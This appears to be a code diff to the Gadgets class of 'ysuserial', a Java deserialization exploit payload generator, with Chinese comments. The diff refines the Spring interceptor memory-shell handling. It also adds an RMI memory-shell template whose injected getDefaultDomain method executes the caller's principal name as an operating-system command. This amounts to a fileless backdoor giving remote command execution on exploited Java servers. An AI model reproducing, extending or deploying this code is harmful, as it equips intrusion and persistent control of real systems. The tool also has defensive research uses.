@@ -22,7 +22,6 @@ import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
 import org.apache.commons.codec.binary.Base64;
 import org.apache.commons.lang.RandomStringUtils;
 import org.apache.wicket.util.file.Files;
-import org.su18.ysuserial.payloads.templates.memshell.spring.SpringInterceptorMS;
 
 
 @SuppressWarnings({
@@ -141,7 +140,7 @@ public class Gadgets {
 				if (command.contains("-")) {
 					String[] commands = command.split("[-]");
 					name = commands[0];
-					type = command.split("[-]")[1];
+					type = command.substring(command.indexOf("-") + 1);
 				} else {
 					name = command;
 				}
@@ -210,7 +209,7 @@ public class Gadgets {
 			String className = myClass.getName();
 			ctClass = pool.get(className);
 
-			// 如果是打入 Spring 拦截器类型的内存马，则修改 SpringInterceptorTemplate 创建类字节码，并写入 SpringInterceptorMS 中
+			// 如果是打入 Spring Controller 类型的内存马，则修改 SpringInterceptorTemplate 创建类字节码，并写入 SpringInterceptorMS 中
 			if (className.contains("SpringInterceptorMS")) {
 				ctClass.setSuperclass(superClass);
 				String  target              = "org.su18.ysuserial.payloads.templates.memshell.spring.SpringInterceptorTemplate";
@@ -225,7 +224,35 @@ public class Gadgets {
 				// 修改 SpringInterceptorMemShell 随机命名 防止二次打不进去
 				String clazzNameContent = "clazzName=\"" + clazzName + "\";";
 				ctClass.makeClassInitializer().insertBefore(clazzNameContent);
-				ctClass.setName(SpringInterceptorMS.class.getName() + System.nanoTime());
+				ctClass.setName(className + System.nanoTime());
+				classBytes = ctClass.toBytecode();
+
+			} else if (className.contains("RMIBindTemplate")) {
+				// 如果是 RMI 内存马，则修改其中的 registryPort、bindPort、serviceName，插入关键方法
+				ctClass.setSuperclass(superClass);
+
+				String[] parts = cName.split("-");
+
+				if (parts.length < 3) {
+					// BindPort 写 0 就是随机端口
+					throw new IllegalArgumentException("Command format is: EX-MS-RMIBindTemplate-<RegistryPort>-<BindPort>-<ServiceName>");
+				}
+
+				// 插入关键参数
+				String rPortString = "port=" + parts[0] + ";";
+				ctClass.makeClassInitializer().insertBefore(rPortString);
+				String bPort = "bindPort=" + parts[1] + ";";
+				ctClass.makeClassInitializer().insertBefore(bPort);
+				String sName = "serviceName=\"" + parts[2] + "\";";
+				ctClass.makeClassInitializer().insertBefore(sName);
+
+				ctClass.setInterfaces(new CtClass[]{pool.get("javax.management.remote.rmi.RMIConnection"), pool.get("java.io.Serializable")});
+
+				// 插入目标执行类
+				insertCMD(ctClass);
+				ctClass.addMethod(CtMethod.make("public String getDefaultDomain(javax.security.auth.Subject subject) throws java.io.IOException {return new String(execCmd(((java.security.Principal)subject.getPrincipals().iterator().next()).getName()).toByteArray());}", ctClass));
+
+				ctClass.setName(className + System.nanoTime());
 				classBytes = ctClass.toBytecode();
 			} else {
 				// 其他的通过类名自定义加载，NeoReg 不改类名
